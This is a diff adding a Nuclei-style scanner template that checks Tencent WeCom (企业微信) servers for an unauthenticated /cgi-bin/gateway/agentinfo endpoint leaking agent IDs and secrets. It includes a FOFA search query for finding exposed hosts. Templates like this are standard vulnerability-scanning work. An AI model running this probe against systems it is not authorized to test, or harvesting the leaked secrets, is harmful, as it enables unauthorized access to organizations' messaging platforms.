@@ -1,0 +1,30 @@
+id: qywechat-secret-disclosure
+
+info:
+  name: "企业微信cgi-bin 接口信息泄露"
+  author: Co5mos
+  severity: critical
+  metadata:
+    max-request: 1
+    fofa-query: app="Tencent-企业微信"
+  tags: Tencent-企业微信
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/gateway/agentinfo"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"errcode\":0"
+          - "\"errmsg\":\"ok\""
+          - "agentid"
+          - "Secret"
+        condition: and
+
+      - type: status
+        status:
+          - 200
